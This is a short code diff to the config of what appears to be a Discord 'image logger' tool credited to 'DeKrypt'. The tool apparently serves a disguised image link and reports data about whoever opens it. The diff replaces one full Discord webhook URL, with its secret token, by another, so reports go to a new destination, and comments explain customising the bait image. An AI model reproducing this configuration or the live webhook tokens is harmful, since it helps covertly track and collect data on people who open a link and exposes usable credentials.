@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1336061029884493864/BMb-bAMHUo-M5Sbxi7FvzXZjuFu3aa-cy9KaAN4eKREN1PSIzngI5Vd8KTiXfGkj0iaS",
+    "webhook": "https://discordapp.com/api/webhooks/1346177563030061078/0cf4V4m96zTbdkeusOuAZz1CuzwvE3v_ETAnf6E79gg3fhq5mr4nV1GAIZpCOS5TVexg",
     "image": "https://previews.123rf.com/images/rorygezfresh/rorygezfresh2204/rorygezfresh220400055/185335583-niewyra%C5%BAne-kolorowe-holograficzne-t%C5%82o-niewyra%C5%BAny-teksturowany-gradient-w-r%C3%B3%C5%BCowych-kolorach.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
